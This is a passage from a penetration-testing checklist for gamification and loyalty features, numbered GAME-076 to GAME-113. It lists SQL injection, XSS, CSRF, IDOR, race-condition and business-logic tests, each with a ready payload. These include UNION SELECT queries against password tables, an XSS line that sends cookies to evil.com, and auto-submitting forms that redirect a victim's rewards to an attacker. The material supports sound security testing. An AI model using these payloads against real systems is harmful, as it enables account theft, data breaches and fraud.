Change from_account=LOYAL-1001 to from_account=LOYAL-1002 in transfer request
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## GAME-076 — Loyalty Program SQL Injection
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Loyalty Program

**Test Steps:** 1. Search or filter loyalty transactions. 2. Inject SQL payloads in search parameters. 3. Check for data extraction or authentication bypass.

**Expected Result:** Application must use parameterized queries for all loyalty program database operations.

**Payload Example:**

```
GET /api/loyalty/transactions?type=' OR 1=1--;GET /api/loyalty?search=test' UNION SELECT card_number FROM loyalty--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## GAME-077 — Loyalty Reward Catalog Manipulation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Loyalty Program

**Test Steps:** 1. Browse loyalty reward catalog. 2. Intercept redemption request. 3. Modify the points_required for a high-value reward to a lower value. 4. Submit and check if the manipulated cost is accepted.

**Expected Result:** Application must determine redemption costs server-side from the reward catalog and not accept client-provided point costs.

**Payload Example:**

```
Change points_required=10000 to points_required=1 for premium reward redemption
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## GAME-078 — CSRF on Loyalty Points Redemption
**Test Category:** CSRF (WSTG-SESS-05) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Loyalty Program

**Test Steps:** 1. Craft a malicious page that redeems the victim's loyalty points for a gift card to attacker's email. 2. Lure victim to visit. 3. Check if redemption occurs.

**Expected Result:** Application must validate CSRF tokens on all loyalty points redemption operations.

**Payload Example:**

```
<form action='https://target.com/api/loyalty/redeem' method='POST'><input name='reward_id' value='GIFT-CARD'><input name='email' value='attacker@evil.com'></form><script>document.forms[0].submit()</script>
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite;Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## GAME-079 — Loyalty Account Merge Exploitation
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Loyalty Program

**Test Steps:** 1. If loyalty account merging exists create multiple accounts. 2. Accumulate points on each. 3. Merge all into one account. 4. Check if merged points exceed legitimate earning potential.

**Expected Result:** Application must validate loyalty account merge requests and implement controls to prevent artificial point accumulation through merging.

**Payload Example:**

```
Merge 10 loyalty accounts each with signup bonuses into single account;check for bonus stacking
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## GAME-080 — Loyalty Program Race Condition on Redemption
**Test Category:** Business Logic (WSTG-BUSL-08) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Loyalty Program

**Test Steps:** 1. Check loyalty balance. 2. Simultaneously send multiple redemption requests each using the full balance. 3. Check if multiple redemptions succeed exceeding the actual balance.

**Expected Result:** Application must implement atomic balance checks and deductions with proper locking to prevent double-spending of loyalty points.

**Payload Example:**

```
Send 10 concurrent POST /api/loyalty/redeem each requesting full 5000-point balance simultaneously
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder;Burp Suite

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## GAME-081 — IDOR on Progress Data Access
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Progress Tracking

**Test Steps:** 1. View own progress data. 2. Change user_id to access other users' progress. 3. Check if detailed activity patterns and goals are exposed.

**Expected Result:** Application must enforce access control on progress data and only allow users to view their own tracking information.

**Payload Example:**

```
GET /api/progress?user_id=1002;GET /api/users/1002/progress-tracking with User A credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## GAME-082 — Progress Value Manipulation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Progress Tracking

**Test Steps:** 1. Update progress on a tracked metric. 2. Intercept the request and modify progress_value. 3. Set progress to 100% or maximum value. 4. Check if immediate completion triggers rewards.

**Expected Result:** Application must validate progress updates against actual verifiable actions and not accept arbitrary client-provided progress values.

**Payload Example:**

```
Change progress_value=5 to progress_value=100 or progress_percentage=100 in PUT /api/progress/update
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## GAME-083 — Progress Reset for Reward Re-Earning
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Progress Tracking

**Test Steps:** 1. Complete a tracked goal and earn the reward. 2. Reset the progress via API. 3. Re-complete the goal. 4. Check if the reward is granted again.

**Expected Result:** Application must track lifetime achievement completions and prevent re-earning of one-time rewards through progress resets.

**Payload Example:**

```
POST /api/progress/reset/GOAL-001 then re-complete and POST /api/progress/GOAL-001/claim-reward
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite;Postman

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## GAME-084 — SQL Injection in Progress Filters
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Progress Tracking

**Test Steps:** 1. Filter progress data by date or category. 2. Inject SQL payloads in filter parameters. 3. Observe response for SQL errors or data leakage.

**Expected Result:** Application must use parameterized queries for all progress tracking queries.

**Payload Example:**

```
GET /api/progress?category=' OR 1=1--;GET /api/progress?date_from=2025-01-01' UNION SELECT email FROM users--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## GAME-085 — Progress API Rate Limiting
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Progress Tracking

**Test Steps:** 1. Send rapid progress update requests. 2. Check if unrealistic progress can be logged through high-frequency updates. 3. Test for artificial inflation.

**Expected Result:** Application must implement rate limiting on progress updates and validate that progress increments are realistic.

**Payload Example:**

```
Send 1000+ POST /api/progress/increment requests per minute to artificially inflate progress
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite Intruder;Custom Scripts

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## GAME-086 — XSS in Progress Notes or Comments
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Progress Tracking

**Test Steps:** 1. If progress tracking allows notes or comments inject XSS payload. 2. View progress dashboard. 3. Check if payload executes.

**Expected Result:** Application must sanitize all progress notes and encode output when rendering progress data.

**Payload Example:**

```
progress_note=<script>alert(document.cookie)</script>;comment=<img src=x onerror=alert(1)>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## GAME-087 — Milestone Achievement Forgery
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Milestones

**Test Steps:** 1. Identify a milestone with specific criteria. 2. Intercept the milestone check request. 3. Forge the achievement by modifying criteria_met parameters. 4. Claim the milestone reward.

**Expected Result:** Application must verify milestone criteria against actual server-side data records and not trust client-provided achievement status.

**Payload Example:**

```
POST /api/milestones/MILE-001/claim with criteria_met=true without meeting actual criteria;modify achievement_data
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## GAME-088 — IDOR on Milestone Rewards Claim
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Milestones

**Test Steps:** 1. Claim a milestone reward. 2. Change user_id or milestone_id to claim rewards for other users or claim unearned milestones. 3. Check authorization.

**Expected Result:** Application must verify both user ownership and milestone completion before granting rewards.

**Payload Example:**

```
POST /api/milestones/MILE-001/claim with user_id=1002;claim MILE-PREMIUM not earned by user
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## GAME-089 — Milestone Progress Skipping
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Milestones

**Test Steps:** 1. Identify sequential milestones. 2. Skip intermediate milestones and attempt to claim advanced ones directly. 3. Check if prerequisite validation is enforced.

**Expected Result:** Application must validate that all prerequisite milestones are completed before allowing claim of sequential milestones.

**Payload Example:**

```
POST /api/milestones/MILE-010/claim without completing MILE-001 through MILE-009
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## GAME-090 — Race Condition on Milestone Claim
**Test Category:** Business Logic (WSTG-BUSL-08) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Milestones

**Test Steps:** 1. Reach a milestone threshold. 2. Send multiple simultaneous claim requests. 3. Check if the milestone reward is granted multiple times.

**Expected Result:** Application must implement idempotent milestone claiming with proper concurrency controls.

**Payload Example:**

```
Send 30 concurrent POST /api/milestones/MILE-001/claim requests simultaneously
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder;Burp Suite

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## GAME-091 — Milestone Data Tampering
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Milestones

**Test Steps:** 1. Access milestone criteria data. 2. Attempt to modify the milestone requirements via API. 3. Lower the threshold to easily achievable values. 4. Claim the milestone.

**Expected Result:** Application must make milestone criteria immutable to regular users and only modifiable by authorized administrators.

**Payload Example:**

```
PUT /api/milestones/MILE-001 with required_points=1 instead of required_points=10000
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## GAME-092 — SQL Injection in Milestone Lookup
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Milestones

**Test Steps:** 1. Query milestone details via API. 2. Inject SQL payloads in milestone_id or category parameters. 3. Observe response.

**Expected Result:** Application must use parameterized queries for all milestone-related database operations.

**Payload Example:**

```
GET /api/milestones?id=' OR 1=1--;GET /api/milestones?category=gold' UNION SELECT password FROM admins--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## GAME-093 — Competition Entry Authorization Bypass
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Competitions

**Test Steps:** 1. Find a restricted competition requiring certain eligibility. 2. Attempt to enter without meeting eligibility criteria by directly calling the entry API. 3. Check if entry is accepted.

**Expected Result:** Application must validate all competition eligibility criteria server-side before allowing entry.

**Payload Example:**

```
POST /api/competitions/COMP-PREMIUM/enter without required tier level;modify eligible=true in request
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## GAME-094 — Competition Score Injection
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Competitions

**Test Steps:** 1. Submit competition scores. 2. Intercept the score submission request. 3. Modify the score to an impossibly high value. 4. Check if the manipulated score is accepted and ranked.

**Expected Result:** Application must validate competition scores server-side against expected ranges and game mechanics and reject anomalous scores.

**Payload Example:**

```
Change POST /api/competitions/COMP-001/submit with score=50 to score=9999999
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## GAME-095 — Competition Result Tampering
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Competitions

**Test Steps:** 1. Check if competition results can be modified via API. 2. Attempt to change rankings or winner designation. 3. Access admin result management endpoints.

**Expected Result:** Application must restrict competition result modification to authorized admin roles with audit logging.

**Payload Example:**

```
PUT /api/competitions/COMP-001/results with winner=attacker_id;POST /api/admin/competitions/results with regular user
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## GAME-096 — IDOR on Competition Entry Data
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Competitions

**Test Steps:** 1. View own competition entry. 2. Change entry_id to view other participants' entries. 3. Check if strategies or submissions are exposed.

**Expected Result:** Application must verify entry ownership before displaying competition entry details.

**Payload Example:**

```
GET /api/competitions/entries/ENTRY-2001 with non-owner credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## GAME-097 — Competition Timer Manipulation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Competitions

**Test Steps:** 1. Enter a timed competition. 2. Intercept completion request. 3. Modify the time_taken or started_at parameter. 4. Submit artificially fast completion time.

**Expected Result:** Application must track competition timers server-side using server timestamps and not accept client-provided timing data.

**Payload Example:**

```
Change time_taken=600 to time_taken=1;modify started_at to very recent timestamp
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## GAME-098 — Competition Prize Manipulation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Competitions

**Test Steps:** 1. Win a competition. 2. Intercept the prize claim request. 3. Modify prize_id or prize_value to a higher-value prize. 4. Check if the manipulated prize is granted.

**Expected Result:** Application must determine prizes server-side based on competition results and not accept client-specified prize values.

**Payload Example:**

```
Change prize_id=BASIC to prize_id=GRAND;modify prize_value=100 to prize_value=10000
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## GAME-099 — Race Condition on Competition Entry
**Test Category:** Business Logic (WSTG-BUSL-08) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Competitions

**Test Steps:** 1. Enter a competition with limited slots. 2. Send multiple simultaneous entry requests. 3. Check if more entries than available slots are accepted.

**Expected Result:** Application must implement atomic slot allocation with proper locking to prevent over-enrollment in limited competitions.

**Payload Example:**

```
Send 50 concurrent POST /api/competitions/COMP-001/enter for competition with 10 remaining slots
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder;Burp Suite

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## GAME-100 — Competition Voting Manipulation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Competitions

**Test Steps:** 1. If competition results depend on voting vote for own entry. 2. Attempt to vote multiple times. 3. Modify vote_count or bypass one-vote-per-user restrictions.

**Expected Result:** Application must enforce one-vote-per-user limits server-side and validate voting eligibility.

**Payload Example:**

```
Send multiple POST /api/competitions/COMP-001/vote for same entry;modify vote_count parameter
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-840; PortSwigger Business logic

---

## GAME-101 — XSS in Competition Submission Content
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Competitions

**Test Steps:** 1. Submit competition entry with XSS payload in the content. 2. View the competition page or gallery. 3. Check if XSS executes for voters and other viewers.

**Expected Result:** Application must sanitize all competition submission content and encode output when rendering entries.

**Payload Example:**

```
submission_content=<script>alert(document.cookie)</script>;entry_title=<img src=x onerror=alert(1)>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## GAME-102 — Reward Redemption IDOR
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Rewards Redemption

**Test Steps:** 1. Redeem a reward. 2. Change reward_id or user_id in the redemption request. 3. Check if unauthorized rewards are redeemed or rewards are redeemed for other users.

**Expected Result:** Application must verify that the user is eligible for the specific reward and owns sufficient points before processing redemption.

**Payload Example:**

```
POST /api/rewards/redeem with reward_id=PREMIUM-REWARD using ineligible account;change user_id to another user
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## GAME-103 — Reward Price Manipulation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Rewards Redemption

**Test Steps:** 1. Select a reward for redemption. 2. Intercept the request and modify the points_cost parameter. 3. Set it to 0 or a very low value. 4. Submit and check if the reward is granted at the manipulated cost.

**Expected Result:** Application must look up reward costs server-side from the reward catalog and not accept client-provided point costs.

**Payload Example:**

```
Change points_cost=5000 to points_cost=0 or points_cost=1 in redemption request
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## GAME-104 — Double Redemption via Race Condition
**Test Category:** Business Logic (WSTG-BUSL-08) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Rewards Redemption

**Test Steps:** 1. Select a reward for redemption with exact points balance. 2. Send multiple simultaneous redemption requests. 3. Check if the reward is redeemed multiple times exceeding point balance.

**Expected Result:** Application must implement atomic point deduction and reward granting with proper database locking.

**Payload Example:**

```
Send 20 concurrent POST /api/rewards/redeem for same reward when balance exactly covers one redemption
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder;Burp Suite

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## GAME-105 — Expired Reward Redemption Bypass
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Rewards Redemption

**Test Steps:** 1. Identify an expired reward in the catalog. 2. Attempt to redeem it via API despite expiry. 3. Modify expiry_date parameter if present. 4. Check if expired rewards can be claimed.

**Expected Result:** Application must validate reward availability and expiry dates server-side at the time of redemption.

**Payload Example:**

```
POST /api/rewards/redeem for expired reward_id;modify expiry_date=2030-12-31 in request
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## GAME-106 — Reward Delivery Address Manipulation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Rewards Redemption

**Test Steps:** 1. Redeem a physical reward. 2. Intercept the redemption request. 3. Change the delivery address to an unvalidated address. 4. Check if address validation is enforced for reward delivery.

**Expected Result:** Application must validate delivery addresses for physical reward redemptions and prevent address manipulation.

**Payload Example:**

```
Change shipping_address in reward redemption to PO Box or international address when restricted
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## GAME-107 — Reward Redemption Without Sufficient Points
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Rewards Redemption

**Test Steps:** 1. Attempt to redeem a reward costing more points than available balance. 2. Bypass frontend balance check by calling API directly. 3. Check if negative balance is possible.

**Expected Result:** Application must validate point balance server-side before processing redemption and prevent negative balances.

**Payload Example:**

```
POST /api/rewards/redeem with reward requiring 10000 points when balance is only 100
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## GAME-108 — Reward Inventory Bypass
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Rewards Redemption

**Test Steps:** 1. Check if a reward has limited inventory. 2. Attempt to redeem when inventory shows 0. 3. Bypass frontend availability check via API. 4. Check if out-of-stock rewards can be redeemed.

**Expected Result:** Application must validate reward inventory server-side and reject redemptions for out-of-stock rewards.

**Payload Example:**

```
POST /api/rewards/redeem for reward with inventory=0;modify inventory_check=false in request
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## GAME-109 — SQL Injection in Reward Search
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Rewards Redemption

**Test Steps:** 1. Search or filter available rewards. 2. Inject SQL payloads in search parameters. 3. Observe for data extraction or authentication bypass.

**Expected Result:** Application must use parameterized queries for all reward catalog operations.

**Payload Example:**

```
GET /api/rewards?search=' OR 1=1--;GET /api/rewards?category=gift' UNION SELECT email;password FROM users--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## GAME-110 — XSS in Reward Description Display
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Rewards Redemption

**Test Steps:** 1. If admin-created reward descriptions contain dynamic content check for XSS. 2. If user feedback on rewards is displayed inject XSS in reviews. 3. View rewards page.

**Expected Result:** Application must sanitize all reward content and user feedback before rendering.

**Payload Example:**

```
reward_review=<script>alert(document.cookie)</script>;feedback=<svg/onload=fetch('https://evil.com/'+document.cookie)>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## GAME-111 — CSRF on Reward Redemption
**Test Category:** CSRF (WSTG-SESS-05) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Rewards Redemption

**Test Steps:** 1. Craft a malicious page that redeems the victim's points for a digital reward sent to attacker's email. 2. Lure victim to visit. 3. Check if redemption occurs.

**Expected Result:** Application must validate CSRF tokens on all reward redemption endpoints.

**Payload Example:**

```
<form action='https://target.com/api/rewards/redeem' method='POST'><input name='reward_id' value='GIFT-CARD'><input name='delivery_email' value='attacker@evil.com'><input name='points' value='5000'></form><script>document.forms[0].submit()</script>
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite;Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## GAME-112 — Reward Redemption Code Prediction
**Test Category:** Information Disclosure (WSTG-INFO-04) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Rewards Redemption

**Test Steps:** 1. Redeem multiple rewards and collect the redemption codes. 2. Analyze the pattern of generated codes. 3. Attempt to predict future codes. 4. Test predicted codes for validity.

**Expected Result:** Application must generate cryptographically random redemption codes that cannot be predicted from previous codes.

**Payload Example:**

```
Analyze codes like RWD-001234;RWD-001235 for sequential pattern;test predicted next codes
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## GAME-113 — Social Share Verification Bypass
